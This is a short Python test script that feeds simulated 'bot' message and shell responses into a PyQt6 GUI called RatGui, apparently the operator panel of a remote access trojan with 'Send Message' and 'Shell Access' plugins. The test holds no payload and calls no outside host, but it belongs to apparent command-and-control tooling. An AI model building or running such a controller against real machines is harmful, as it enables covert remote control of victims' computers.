# Test dispatching sample messages into RatGui/router and observe plugin handling
import sys
sys.path.insert(0, '.')
from PyQt6.QtWidgets import QApplication
from SPECTRE import RatGui
import time

def run_test():
    app = QApplication([])
    gui = RatGui()
    # Find Send Message plugin
    msg_plugin = None
    shell_plugin = None
    for p in gui.plugins:
        if getattr(p, 'name', '') == 'Send Message':
            msg_plugin = p
        if getattr(p, 'name', '') == 'Shell Access':
            shell_plugin = p
    print('Plugins loaded:', [getattr(p,'name',None) for p in gui.plugins])

    # Send a message_response (simulate bot reply) — no dialog open, should buffer
    sample_msg = {'type':'message_response','ip':'127.0.0.1','id':'bot-test','message':'Hello from bot'}
    print('Dispatching message_response...')
    gui.handle_message(sample_msg)
    time.sleep(0.1)
    if msg_plugin:
        print('Message buffers keys:', list(msg_plugin.message_buffers.keys()))
        print('Buffered messages for bot-test:', msg_plugin.message_buffers.get('127.0.0.1:bot-test'))

    # Send a shell_response (simulate shell output) — no shell dialog open
    sample_shell = {'type':'shell_response','ip':'127.0.0.1','id':'bot-test','result':'file1\nfile2','current_dir':'C:/'}
    print('Dispatching shell_response...')
    gui.handle_message(sample_shell)
    time.sleep(0.1)
    if shell_plugin:
        print('Shell plugin current_dirs:', shell_plugin.current_dirs)

    # Cleanup
    try:
        gui.close()
    except Exception:
        pass
    app.quit()

if __name__ == '__main__':
    run_test()
